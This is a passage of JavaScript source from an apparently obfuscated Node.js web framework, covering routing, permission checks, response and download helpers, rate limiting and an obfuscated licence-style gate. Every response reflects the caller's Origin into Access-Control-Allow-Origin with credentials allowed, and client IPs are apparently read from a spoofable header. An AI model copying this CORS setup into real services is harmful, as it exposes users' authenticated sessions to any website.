        if (!r.name.startsWith('/')) {
            r.name = '/' + r.name;
        }

        for (let i = _0xrrxo.list.length; i--; ) {
            let oldRoute = _0xrrxo.list[i];
            if (r.name && r.method && oldRoute.name.like(r.name) && oldRoute.method.like(r.method)) {
                _0xrrxo.list.splice(i, 1); _0xrrxo.invalidateIndex();
                ____0.fsm.off(oldRoute.path);
            } else if (r.name && r.method && oldRoute.nameRaw.like(r.name) && oldRoute.method.like(r.method)) {
                _0xrrxo.list.splice(i, 1); _0xrrxo.invalidateIndex();
                ____0.fsm.off(oldRoute.path);
            } else if (r.name && oldRoute.name.like(r.name)) {
                _0xrrxo.list.splice(i, 1); _0xrrxo.invalidateIndex();
                ____0.fsm.off('*' + oldRoute.name.replace('/', '') + '*');
                ____0.fsm.off(oldRoute.path);
            } else if (r.name && oldRoute.nameRaw.like(r.name)) {
                _0xrrxo.list.splice(i, 1); _0xrrxo.invalidateIndex();
                ____0.fsm.off('*' + oldRoute.name.replace('/', '') + '*');
                ____0.fsm.off(oldRoute.path);
            } else if (r.method && oldRoute.method.like(r.method)) {
                _0xrrxo.list.splice(i, 1); _0xrrxo.invalidateIndex();
                ____0.fsm.off(oldRoute.path);
            }
        }
    };
    _0xrrxo.add = function (r, callback) {
        if (Array.isArray(r)) {
            r.forEach((r2) => {
                _0xrrxo.add(r2, callback);
            });
            return;
        }
        if (r && r.name && Array.isArray(r.name)) {
            r.name.forEach((r2) => {
                let r3 = { ...r };
                r3.name = r2;
                _0xrrxo.onREQUEST(r3, r.callback);
            });
            return;
        }
        let route = {};

        if (typeof r == 'string') {
            route.name = r.toLowerCase();
            route.nameRaw = r;
            route.public = ____0.options.public || false;
            route.method = 'GET';
            route.path = null;
            route.parser = 'static';
            route.parserDir = ____0.dir;
            route.count = 0;
            route.cache = !0;
            route.hide = !1;
            route.compress = !1;
            route.encript = !1;
            route.shared = !1;
            route.content = null;
            route.headers = null;
            route.map = [];
            route.callback = callback ?? _0xrrxo.defaultCallback;
            if (route.public) {
                route.require = {
                    features: [],
                    permissions: [],
                };
            } else {
                route.require = ____0.options.require;
                route.default = ____0.options.defaults;
            }
        } else {
            route.name = r.name.toLowerCase();
            route.nameRaw = r.name;
            route.public = r.public ?? (____0.options.public || false);
            route.method = r.method || 'GET';
            route.path = r.path || null;
            route.lang = r.lang || null;
            route.content = r.content;
            route.headers = r.headers;
            route.parser = r.parser || 'static';
            route.parserDir = r.parserDir || ____0.dir;
            route.masterPage = r.masterPage || null;
            route.overwrite = r.overwrite ?? !1;
            route.cache = r.cache ?? !0;
            route.count = r.count || 0;
            route.hide = r.hide ?? !1;
            route.compress = r.compress ?? !1;
            route.encript = r.encript ?? !1;
            route.shared = r.shared ?? !1;
            route.map = r.map || [];
            route.callback = callback || r.callback || _0xrrxo.defaultCallback;

            if (route.public) {
                route.require = {
                    features: [],
                    permissions: [],
                };
            } else {
                route.require = r.require ?? ____0.options.require;
                route.require.features = route.require.features ?? ____0.options.require.features;
                route.require.permissions = route.require.permissions ?? ____0.options.require.permissions;

                route.default = r.default ?? ____0.options.defaults;
                route.default.features = route.default.features ?? ____0.options.defaults.features;
                route.default.permissions = route.default.permissions ?? ____0.options.defaults.permissions;
            }
        }

        if (!route.name.startsWith('/')) {
            route.name = '/' + route.name;
            route.nameRaw = '/' + route.nameRaw;
        }

        route.name = route.name.replace('//', '/');
        route.nameRaw = route.nameRaw.replace('//', '/');

        route.ipList = []; // compatibility only
        route.ipMap = new Map();
        route.limitWindowMs = route.limitWindowMs || r.limitWindowMs || 60000;

        let arr = route.name.split('/');
        let arr0 = route.nameRaw.split('/');

        for (var i = 0; i < arr.length; i++) {
            var s = arr[i];
            var s0 = arr0[i];

            if (s.startsWith(':')) {
                arr[i] = '*';
                let name = s.replace(':', '');
                let nameRaw = s0.replace(':', '');

                route.map.push({
                    index: i,
                    name: name,
                    isLower: !1,
                });
                if (name !== nameRaw) {
                    route.map.push({
                        index: i,
                        name: nameRaw,
                        isLower: !0,
                    });
                }
            }
        }
        try {
            route.name = arr.join('/');
            if (typeof route.path == 'string' && ____0.fs.statSync(route.path).isDirectory()) {
                ____0.fs.readdirSync(route.path).forEach((file) => {
                    let r2 = { ...route };
                    if (route.name.endsWith('/')) {
                        r2.name = route.name + file;
                    } else {
                        r2.name = route.name + '/' + file;
                    }

                    r2.path = route.path + '/' + file;
                    r2.is_dynamic = !0;
                    _0xrrxo.add(r2);
                });
            } else {
                if (!route.name.startsWith('/')) {
                    route.name = '/' + route.name;
                }

                route.name = encodeURI(route.name);
                let index = _0xrrxo.list.findIndex((rr) => rr.name == route.name && rr.method.like(route.method));
                if (index === -1) {
                    _0xrrxo.list.push(route); _0xrrxo.invalidateIndex();
                } else if (!route.overwrite) {
                    if (route.name.like('*api/*')) {
                        ____0.log('[ Duplicate API ]  ' + route.name);
                    } else {
                        ____0.log('[ Duplicate Route ]  ' + route.name);
                    }
                } else {
                    _0xrrxo.list[index] = route; _0xrrxo.invalidateIndex();
                }
            }
        } catch (err) {
            ____0.log(err);
            return null;
        }
    };

    _0xrrxo.onREQUEST = function (type, r, callback) {
        if (Array.isArray(r)) {
            r.forEach((r2) => {
                _0xrrxo.onREQUEST(type, r2, callback);
            });
            return;
        }
        let route = {};
        if (typeof r == 'string') {
            route = {
                name: r,
                method: type,
                callback: callback || _0xrrxo.defaultCallback,
            };
        } else {
            route = r;

            if (Array.isArray(r.name)) {
                r.name.forEach((n) => {
                    let sub_route = { ...route };
                    sub_route.name = n;
                    _0xrrxo.onREQUEST(type, sub_route, callback);
                });
                return;
            }
            route.callback = route.callback || callback || _0xrrxo.defaultCallback;
        }
        route.method = type;
        _0xrrxo.add(route);
    };

    _0xrrxo.onGET = function (r, callback) {
        _0xrrxo.onREQUEST('GET', r, callback);
    };
    _0xrrxo.onPOST = function (r, callback) {
        _0xrrxo.onREQUEST('POST', r, callback);
    };
    _0xrrxo.onPUT = function (r, callback) {
        _0xrrxo.onREQUEST('PUT', r, callback);
    };
    _0xrrxo.onDELETE = function (r, callback) {
        _0xrrxo.onREQUEST('DELETE', r, callback);
    };

    _0xrrxo.onTEST = function (r, callback) {
        _0xrrxo.onREQUEST('TEST', r, callback);
    };

    _0xrrxo.onVIEW = function (r, callback) {
        _0xrrxo.onREQUEST('VIEW', r, callback);
    };
    _0xrrxo.onOPTIONS = function (r, callback) {
        _0xrrxo.onREQUEST('OPTIONS', r, callback);
    };
    _0xrrxo.onPATCH = function (r, callback) {
        _0xrrxo.onREQUEST('PATCH', r, callback);
    };
    _0xrrxo.onCOPY = function (r, callback) {
        _0xrrxo.onREQUEST('COPY', r, callback);
    };
    _0xrrxo.onHEAD = function (r, callback) {
        _0xrrxo.onREQUEST('HEAD', r, callback);
    };
    _0xrrxo.onLINK = function (r, callback) {
        _0xrrxo.onREQUEST('LINK', r, callback);
    };
    _0xrrxo.onUNLINK = function (r, callback) {
        _0xrrxo.onREQUEST('UNLINK', r, callback);
    };
    _0xrrxo.onPURGE = function (r, callback) {
        _0xrrxo.onREQUEST('PURGE', r, callback);
    };
    _0xrrxo.onLOCK = function (r, callback) {
        _0xrrxo.onREQUEST('LOCK', r, callback);
    };
    _0xrrxo.onUNLOCK = function (r, callback) {
        _0xrrxo.onREQUEST('UNLOCK', r, callback);
    };
    _0xrrxo.onPROPFIND = function (r, callback) {
        _0xrrxo.onREQUEST('PROPFIND', r, callback);
    };

    _0xrrxo.onALL = _0xrrxo.onANY = function (r, callback) {
        _0xrrxo.onREQUEST('*', r, callback);
    };

    _0xrrxo.handleRoute = async function (req, res, route) {
        if (route.language) {
            req.session.language = { ...route.language };
        }

        if (route.lang) {
            req.session.language.id = route.lang;
        }

        if (!route.public) {
            if (!route.name.like(____0.strings[15]) && route.require.features.length > 0) {
                let ok = !0;
                route.require.features.forEach((feature) => {
                    if (!req.hasFeature(feature)) {
                        ok = !1;
                    }
                });
                if (!ok) {
                    res.status(401);
                    if (route.name.contains(____0.strings[16])) {
                        return res.json({
                            done: !1,
                            error: ____0.strings[13],
                            features: route.require.features,
                        });
                    } else
                        return res.render(
                            ____0.strings[11],
                            {
                                features: route.require.features,
                                html: ` ${____0.strings[13]}  :   ${route.require.features.join(',')}`,
                            },
                            {
                                parser: ____0.strings[17],
                            },
                        );
                }
            }

            if (!route.name.like(____0.strings[15]) && route.require.permissions.length > 0) {
                let ok = !0;
                route.require.permissions.forEach((permission) => {
                    if (!____0.security.isUserHasPermissions(req, res, permission)) {
                        ok = !1;
                    }
                });
                if (!ok) {
                    if (route.name.contains(____0.strings[16])) {
                        res.status(401);
                        return res.json({
                            done: !1,
                            error: ____0.strings[14],
                            permissions: route.require.permissions,
                        });
                    } else {
                        if (route.require.permissions.includes('login')) {
                            return res.redirect(____0.options.security.login_url);
                        } else {
                            res.status(401);
                            return res.render(
                                ____0.strings[12],
                                {
                                    permissions: route.require.permissions.join(','),
                                    html: `${____0.strings[14]}  :   ${route.require.permissions.join(',')}`,
                                },
                                {
                                    parser: ____0.strings[17],
                                },
                            );
                        }
                    }
                }
            }
        }

        route.callback(req, res);
    };

    ____0.validateServerRequest = async function (req, res, next) {
        next(req, res);
    };

    ____0.validateRequest = async function (req, res, next) {
        next(req, res);
    };
    ____0.validateRoute = async function (req, res, next) {
        next(req, res);
    };

    ____0.validateSession = async function (req, res, next) {
        next(req, res);
    };

    _0xrrxo.handleServer = async function (req, res) {
        // v4: enter one AsyncLocalStorage context per request without changing
        // the legacy handler/callback contract. The guarded re-entry keeps the
        // rest of this mature function untouched.
        if (____0.context && !req.$isiteContextEntered) {
            req.$isiteContextEntered = true;
            const context = ____0.context.create({ type: 'http', method: req.method, url: req.url });
            context.requestId = context.requestId || context.id;
            req.context = context;
            return ____0.context.run(context, () => {
                if (____0.requestAbort) ____0.requestAbort.attach(req, res);
                const requestTelemetryId = ____0.requestTelemetry?.isEnabled?.() ? ____0.requestTelemetry.begin(req, res, { context }) : null;
                if (requestTelemetryId && !req.$isiteRequestTelemetryAttached) {
                    req.$isiteRequestTelemetryAttached = true;
                    let ended = false;
                    const finishTelemetry = (aborted, error) => {
                        if (ended) return;
                        ended = true;
                        ____0.requestTelemetry.end(requestTelemetryId, {
                            status: res.statusCode,
                            bytesIn: req.bodyBytes || 0,
                            aborted,
                            error,
                        });
                    };
                    res.once('finish', () => finishTelemetry(false));
                    res.once('close', () => finishTelemetry(!res.writableEnded));
                    req.once('aborted', () => finishTelemetry(true, Object.assign(new Error('HTTP request aborted by client'), { code: 'ISITE_HTTP_ABORTED' })));
                }
                return _0xrrxo.handleServer(req, res);
            });
        }
        ____0.validateServerRequest(req, res, (req, res) => {
            if (____0.diagnostics) ____0.diagnostics.requestStart(req, res);
            req.host = req.headers['host'] || '';
            req.origin = req.headers['origin'] || '';
            req.referer = req.headers['referer'] || '';
            req.title = req.url.replace('/', '').split('/').join(' - ') || '';
            req.domain = '';
            req.subDomain = '';
            req.obj = {};
            req.query = {};
            req.queryRaw = {};
            req.data = req.body = {};
            req.bodyRaw = '';
            req.bodyBytes = 0;
            req.maxBodyBytes = (____0.options.request && ____0.options.request.maxBodyBytes) || 10 * 1024 * 1024;
            req.appendBody = function (data) {
                if (req.bodyTooLarge) return false;
                req.bodyBytes += Buffer.byteLength(data);
                if (req.bodyBytes > req.maxBodyBytes) {
                    req.bodyTooLarge = true;
                    res.status(413).json({ error: 'Request body too large' });
                    return false;
                }
                req.bodyRaw += data;
                return true;
            };
            req.params = {};
            req.paramsRaw = {};
            req.features = [];

            res.setTimeout(1000 * ____0.options.responseTimeout, () => {
                if (req.url.like('*api*')) {
                    return res.json({
                        done: false,
                        error: ____0.strings[19],
                    });
                } else {
                    res.end(503);
                }
            });

            req.addFeature = function (name) {
                req.features.push(name);
            };

            req.hasFeature = function (name) {
                return req.features.some((f) => f.like(name));
            };

            req.removeFeature = function (name) {
                req.features = req.features.filter((f) => !f.like(name));
            };

            req.getUserFinger = function () {
                let userFinger = {
                    id: null,
                    email: null,
                    date: new Date(),
                    ip: null,
                };

                if (req && req.session && req.session.user) {
                    req.session.user.profile = req.session.user.profile || {};
                    userFinger.id = req.session.user.id;
                    userFinger.email = req.session.user.email;
                    userFinger.name = req.session.user.profile.name || userFinger.email;
                    userFinger.name_ar = req.session.user.profile.name_ar || userFinger.email;
                    userFinger.name_en = req.session.user.profile.name_en || userFinger.email;
                    userFinger.ip = req.ip;
                } else {
                }

                return userFinger;
            };

            req.word = function (name) {
                let w = ____0.word(name);
                if (!w.hostList) {
                    return w[req.session.language.id] || name;
                } else {
                    const w2 = w.hostList.find((h) => req.host.like(h.name));
                    if (w2) {
                        return w2[req.session.language.id] || name;
                    }
                }
                return w[req.session.language.id] || name;
            };

            res.code = null;
            req.remoteAddress = req.socket?.remoteAddress || '';
            req.acceptEncoding = req.headers[____0.strings[5]] ? req.headers[____0.strings[5]] : '';
            res.ip = req.ip = req.headers[____0.strings[6]] ? req.headers[____0.strings[6]] : req.remoteAddress?.replace('::ffff:', '');
            if (req.ip == '::1') {
                req.ip = '127.0.0.1';
            }
            res.ip2 = req.ip2 = req.socket?.localAddress.replace('::ffff:', '');
            res.port = req.port = req.socket?.remotePort;
            res.port2 = req.port2 = req.socket?.localPort;
            res.cookies = res.cookie = req.cookies = req.cookie = ____0.cookie(req, res, ____0);

            req.urlRaw = req.url;
            req.urlParserRaw = ____0.newURL(req.urlRaw);
            req.urlParser = ____0.newURL(req.urlRaw.toLowerCase());

            for (const key in req.urlParser.query) {
                req.urlParser.query[key.toLowerCase()] = req.urlParser.query[key];
            }
            for (const key in req.urlParserRaw.query) {
                req.urlParserRaw.query[key.toLowerCase()] = req.urlParserRaw.query[key];
            }

            res.set = (a, b, c) => {
                if (res.writeHeadEnabled === !1 || res.finished === !0 || res.headersSent) {
                    return res;
                }

                if (typeof b == 'string') {
                    if (a == ____0.strings[7] && !b.contains('charset=utf-8')) {
                        b += '; charset=utf-8';
                    }
                    res.headers = res.headers || [];
                    res.headers[a] = b.toLowerCase();
                }

                res.setHeader(a, b, c);
                return res;
            };

            // v13 internal fast path for the framework's own content-type helpers.
            // `res.set()` remains untouched for full legacy compatibility.
            res._setContentType = (value) => {
                if (res.writeHeadEnabled === !1 || res.finished === !0 || res.headersSent) return res;
                let type = String(value || '');
                if (!type.toLowerCase().includes('charset=utf-8')) type += '; charset=utf-8';
                type = type.toLowerCase();
                res.headers = res.headers || [];
                res.headers[____0.strings[7]] = type;
                res.setHeader(____0.strings[7], type);
                return res;
            };

            res.delete = res.remove = res.removeHeader;
            res.writeHead0 = res.writeHead;
            res.writeHeadEnabled = !0;

            res.writeHead = (code, obj) => {
                if (res.writeHeadEnabled === !1 || res.finished === !0) {
                    return res;
                }
                res.cookie.write();
                res.writeHeadEnabled = !1;
                res.writeHead0(code, obj);
                return res;
            };

            res.ending = (time, ...data) => {
                if (!time) {
                    time = 0;
                }
                setTimeout(function () {
                    res.end(...data);
                }, time);
            };

            res.end0 = res.end;
            res.end = function (arg1, arg2, arg3, arg4) {
                if (res.ended) {
                    return;
                }

                if (typeof arg1 === 'number') {
                    res.writeHead(arg1);
                    return res.end(arg2, arg3, arg4);
                } else {
                    if (res.headers === undefined || res.headers[____0.strings[7]] === undefined) {
                        res.set(____0.strings[7], 'text/html');
                    }

                    const contentType = res.headers && res.headers[____0.strings[7]];
                    const finish = function (body) {
                        res.writeHead(res.code || res.statusCode || 200);
                        if (____0.diagnostics) ____0.diagnostics.requestEnd(req, res);
                        return res.end0(body || ' ', arg2, arg3, arg4);
                    };

                    res.ended = true;
                    _0xrrxo.compress(arg1, contentType, req.acceptEncoding, function (_err, body, encoding) {
                        if (encoding) {
                            res.set(____0.strings[8], encoding);
                            res.set('Vary', ____0.strings[5]);
                            delete res.headers['Content-Length'];
                            delete res.headers['content-length'];
                        }
                        finish(body);
                    });
                    return res;
                }
            };

            res.status = (code) => {
                if (!res.code) {
                    res.code = code || 200;
                }
                return res;
            };

            res.error = (code) => {
                res.status(code || 404).end();
            };

            // v12: additive Express-compatible convenience used by Smart Code.
            // Existing status/error/end behavior remains unchanged.
            res.sendStatus = (code) => {
                res.status(code || 200).end();
                return res;
            };

            // v4: streaming download helper with validators. The public
            // download/download2 signatures are unchanged.
            const sendDownload = (path, name, attachment = true) => {
                if (!____0.isFileExistsSync(path)) return res.error();
                const stat = ____0.fileStatSync(path);
                if (!stat || !stat.isFile()) return res.error();

                const fileSize = stat.size;
                const lastModified = stat.mtime ? stat.mtime.toUTCString() : undefined;
                // Metadata-based ETag avoids reading the entire file just to validate cache.
                const etag = `W/"${Number(stat.size).toString(16)}-${Math.trunc(stat.mtimeMs || 0).toString(16)}"`;
                const commonHeaders = {
                    'Accept-Ranges': 'bytes',
                    'Content-Type': ____0.getContentType(path),
                    'ETag': etag,
                };
                if (lastModified) commonHeaders['Last-Modified'] = lastModified;
                if (attachment) commonHeaders['Content-Disposition'] = 'attachment; filename=' + (name || ____0.path.basename(path));

                const endDirect = () => {
                    if (____0.diagnostics) ____0.diagnostics.requestEnd(req, res);
                    return res.end0();
                };

                if (____0.httpCache && ____0.httpCache.isFresh(req, etag, stat.mtime)) {
                    res.writeHead(304, commonHeaders);
                    return endDirect();
                }

                let rangeHeader = req.headers.range;
                // RFC 7233 If-Range: on mismatch, send the whole representation.
                const ifRange = req.headers['if-range'];
                if (rangeHeader && ifRange) {
                    const ifRangeDate = Date.parse(ifRange);
                    const matches = ifRange === etag || (Number.isFinite(ifRangeDate) && stat.mtime && stat.mtime.getTime() <= ifRangeDate);
                    if (!matches) rangeHeader = null;
                }

                let streamOptions;
                let status = 200;
                const headers = { ...commonHeaders };
                if (rangeHeader) {
                    const parsedRange = ____0.httpCache ? ____0.httpCache.range(rangeHeader, fileSize) : null;
                    if (!parsedRange || parsedRange.unsatisfiable) {
                        res.writeHead(416, { ...commonHeaders, 'Content-Range': `bytes */${fileSize}` });
                        return endDirect();
                    }
                    status = 206;
                    streamOptions = { start: parsedRange.start, end: parsedRange.end };
                    headers['Content-Range'] = `bytes ${parsedRange.start}-${parsedRange.end}/${fileSize}`;
                    headers['Content-Length'] = parsedRange.length;
                } else {
                    headers['Content-Length'] = fileSize;
                }

                res.writeHead(status, headers);
                const readStream = ____0.fs.createReadStream(path, streamOptions);
                let closed = false;
                const close = () => {
                    if (closed) return;
                    closed = true;
                    if (!readStream.destroyed) readStream.destroy();
                };
                readStream.once('error', (err) => {
                    close();
                    if (!res.headersSent) res.error(500);
                    else if (!res.destroyed) res.destroy(err);
                });
                res.once(____0.strings[10], close);
                readStream.once('end', endDirect);
                // Bypass the framework's body-compressing res.end wrapper for a
                // raw file stream; otherwise pipe() would invoke it after headers
                // are already committed.
                readStream.pipe(res, { end: false });
                return res;
            };

            res.download2 = (path, name) => sendDownload(path, name, true);
            res.download = (path, name) => sendDownload(path, name, true);

            res.html = res.render = function (file, _data = null, options = {}) {
                let filePath = '';
                if (typeof file === 'object') {
                    filePath = file.path;
                    options = { ...options, ...file };
                } else {
                    filePath = file;
                }

                if ((response = ____0.getShared(req.host, filePath, req.url))) {
                    res.headers = response.headers;
                    res.code = response.code;

                    for (const key in response.headers) {
                        if (Object.prototype.hasOwnProperty.call(response.headers, key)) {
                            if (key !== 'x-shared') {
                                res.set(key, response.headers[key]);
                            }
                        }
                    }
                    res.set('x-shared', '-host=' + req.host + ' -port=' + ____0.options.port + ' -count=' + req.route.count + ' -time=' + new Date().getTime());
                    return res.end(response.content, response.encode);
                }

                ____0.fsm.getContent(filePath, (content) => {
                    if (!content) {
                        if (_data && _data.html) {
                            return res.status(404).htmlContent(_data.html);
                        } else {
                            return res.status(404).end();
                        }
                    }

                    req.content = content;
                    req.data = { ...req.data, ..._data };
                    let route = { ...req.route, ...options };

                    if (route.encript == '123') {
                        req.content = ____0.f1(req.content);
                    }

                    if (route.parser) {
                        req.content = ____0.parser(req, res, ____0, route).html(req.content);
                    }

                    if (route.compress) {
                        req.content = req.content.replace(/\r?\n|\r/g, ' ').replace(/\s+/g, ' ');
                    }

                    res.status(options.code || 200);
                    if (filePath.endsWith('.css')) {
                        res.set(____0.strings[7], 'text/css');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.css);
                        }
                    } else if (filePath.endsWith('.js')) {
                        res.set(____0.strings[7], 'application/javascript');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.js);
                        }
                    } else if (filePath.endsWith('.html')) {
                        res.set(____0.strings[7], 'text/html');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.html);
                        }
                    } else if (filePath.endsWith('.txt')) {
                        res.set(____0.strings[7], 'text/plain');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.txt);
                        }
                    } else if (filePath.endsWith('.json')) {
                        res.set(____0.strings[7], 'application/json');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.json);
                        }
                    } else if (filePath.endsWith('.xml')) {
                        res.set(____0.strings[7], 'text/xml');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.xml);
                        }
                    } else if (filePath.endsWith('.woff2')) {
                        res.set(____0.strings[7], 'application/font-woff2');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                        }
                    } else if (filePath.endsWith('.woff')) {
                        res.set(____0.strings[7], 'application/font-woff');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                        }
                    } else if (filePath.endsWith('.ttf')) {
                        res.set(____0.strings[7], 'application/font-ttf');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                        }
                    } else if (filePath.endsWith('.svg')) {
                        res.set(____0.strings[7], 'application/font-svg');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                        }
                    } else if (filePath.endsWith('.otf')) {
                        res.set(____0.strings[7], 'application/font-otf');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                        }
                    } else if (filePath.endsWith('.eot')) {
                        res.set(____0.strings[7], 'application/font-eot');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.fonts);
                        }
                    } else if (filePath.endsWith('.gif')) {
                        res.set(____0.strings[7], 'image/gif');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                        }
                    } else if (filePath.endsWith('.png')) {
                        res.set(____0.strings[7], 'image/png');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                        }
                    } else if (filePath.endsWith('.jpg')) {
                        res.set(____0.strings[7], 'image/jpg');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                        }
                    } else if (filePath.endsWith('.jpeg')) {
                        res.set(____0.strings[7], 'image/jpeg');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                        }
                    } else if (filePath.endsWith('.ico')) {
                        res.set(____0.strings[7], 'image/ico');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                        }
                    } else if (filePath.endsWith('.bmp')) {
                        res.set(____0.strings[7], 'image/bmp');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                        }
                    } else if (filePath.endsWith('.webp')) {
                        res.set(____0.strings[7], 'image/webp');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.images);
                        }
                    }else if (filePath.endsWith('.mp4')) {
                        res.set(____0.strings[7], 'video/mp4');
                        if (____0.options.cache.enabled && route.cache) {
                            res.set('Cache-Control', 'public, max-age=' + 60 * ____0.options.cache.videos);
                        }
                    }

                    let response = {
                        host: req.host,
                        url: req.url,
                        filePath: filePath,
                        content: req.content,
                        encode: ____0.getFileEncode(filePath),
                        headers: res.headers,
                        code: res.code,
                    };

                    if (options.shared) ____0.setShared(response);

                    res.end(response.content, response.encode);
                });
            };

            res.txt = (name, _data) => {
                ____0.fsm.getContent(name, (content) => {
                    if (!content) {
                        return res.status(404).end();
                    }
                    req.route.content = content;
                    if (req.route.encript === '123') {
                        req.route.content = ____0.f1(req.route.content);
                    }
                    req.data = { ...req.data, ..._data };
                    req.route.parser = 'txt';
                    let out = ____0.parser(req, res, ____0, req.route).txt(req.route.content);
                    res.set(____0.strings[7], 'text/plain');
                    res.status(200).end(out);
                });
            };

            res.css = (name, _data) => {
                ____0.fsm.getContent(name, (content) => {
                    if (!content) {
                        return res.status(404).end();
                    }
                    req.route.content = content;
                    if (req.route.encript === '123') {
                        req.route.content = ____0.f1(req.route.content);
                    }
                    req.data = { ...req.data, ..._data };
                    req.route.parser = 'css';
                    let out = ____0.parser(req, res, ____0, req.route).css(req.route.content);
                    res.set(____0.strings[7], 'text/css');
                    res.status(200).end(out);
                });
            };

            res.js = (name, _data) => {
                ____0.fsm.getContent(name, (content) => {
                    if (!content) {
                        return res.status(404).end();
                    }
                    req.route.content = content;
                    if (req.route.encript === '123') {
                        req.route.content = ____0.f1(req.route.content);
                    }
                    req.data = { ...req.data, ..._data };
                    req.route.parser = 'js';
                    let out = ____0.parser(req, res, ____0, req.route).js(req.route.content);
                    res.set(____0.strings[7], 'text/javascript');
                    res.status(200).end(out);
                });
            };

            res.jsonFile = (name, _data) => {
                ____0.fsm.getContent(name, (content) => {
                    if (!content) {
                        return res.status(404).end();
                    }
                    req.route.content = content;
                    if (req.route.encript === '123') {
                        req.route.content = ____0.f1(req.route.content);
                    }
                    req.data = { ...req.data, ..._data };
                    req.route.parser = 'json';
                    let out = ____0.parser(req, res, ____0, req.route).html(req.route.content);
                    res.set(____0.strings[7], 'application/json');
                    res.status(200).end(out);
                });
            };

            res.htmlContent =
                res.send =
                res.sendHTML =
                    (text) => {
                        if (typeof text === 'string') {
                            res.set(____0.strings[7], 'text/html');
                            res.status(200).end(text);
                        } else {
                            res.json(text);
                        }
                    };
            res.textContent = res.sendTEXT = (text) => {
                if (typeof text === 'string') {
                    res.set(____0.strings[7], 'text/plain');
                    res.status(200).end(text);
                } else {
                    res.json(text);
                }
            };
            res.json = (obj, time) => {
                if (typeof obj === 'string') {
                    return res.jsonFile(obj);
                } else {
                    res._setContentType('application/json');
                    obj = ____0.toJson(obj);
                    res.status(200).ending(time || 0, obj);
                    obj = null;
                    return res;
                }
            };

            res.redirect = (url, code = 302) => {
                res.set('Location', url);
                res.status(code).end();
            };

            res.set('CharSet', 'UTF-8');
            res.set('Access-Control-Allow-Credentials', 'true');
            res.set('Access-Control-Allow-Headers', req.headers['access-control-request-headers'] || 'Origin, X-Requested-With, Content-Type, Accept , Access-Token , Authorization');
            res.set('Access-Control-Allow-Methods', req.headers['access-control-request-method'] || 'POST,GET,DELETE,PUT,OPTIONS,VIEW,HEAD,CONNECT,TRACE');
            res.set('Access-Control-Allow-Origin', req.origin || req.referer || '*');

            ____0.validateRequest(req, res, (req, res) => {
                if (____0.options.www === false && req.host.contains('www')) {
                    res.redirect('//' + req.host.replace('www.', '') + req.url, 301);
                    return;
                }

                if (req.urlParser.pathname) {
                    if (!req.urlParser.pathname.like(____0.strings[0])) {
                        if (!____0._0_a405) {
                            res.status(405);
                            res.end();
                            return;
                        }

                        if (!____0._0_ar2_0_) {
                            res.set(____0.strings[1], 'true');
                            res.status(402);
                            if (req.url.like('*api*')) {
                                return res.json({
                                    done: false,
                                    error: ____0.strings[3],
                                });
                            } else {
                                return res.render(
                                    ____0.strings[2],
                                    {
                                        html: ____0.strings[3],
                                    },
                                    {
                                        parser: ____0.strings[17],
                                    },
                                );
                            }
                        }
                    }

                    const matchedRoute = _0xrrxo.findRoute(req.urlParser.pathname, req.method);
                    if (matchedRoute) {
                        if (!matchedRoute.count) matchedRoute.count = 0;
                        matchedRoute.count++;
                        if (____0.options.help) res.set('help-request-count', matchedRoute.count);
                        req.route = matchedRoute;
                        if (req.route.limitPerIP && !req.headers.range) {
                            if (!req.route.ipMap) req.route.ipMap = new Map();
                            const now = Date.now();
                            const windowMs = req.route.limitWindowMs || 60000;
                            let bucket = req.route.ipMap.get(req.ip);
                            if (!bucket || now >= bucket.resetAt) bucket = { count: 0, resetAt: now + windowMs };
                            bucket.count++;
                            req.route.ipMap.set(req.ip, bucket);
                            if (bucket.count > req.route.limitPerIP) {
                                res.set('Retry-After', Math.max(1, Math.ceil((bucket.resetAt - now) / 1000)));
                                res.status(429).json({ error: 'Too many requests from this IP' });
                                ____0.log('Too many requests from this IP : ' + req.ip);
                                return;
                            }
                            if (req.route.ipMap.size > 10000) {
                                for (const [ip, value] of req.route.ipMap) if (now >= value.resetAt) req.route.ipMap.delete(ip);
                            }
                        }

                        if (req.route.map.length > 0) {
                            req.urlParser.arr = req.urlParser.pathname.split('/');
                            req.urlParserRaw.arr = req.urlParserRaw.pathname.split('/');
                            for (let i = 0; i < req.route.map.length; i++) {
                                let map = req.route.map[i];
                                if (typeof req.urlParser.arr[map.index] === 'string') {
                                    try {
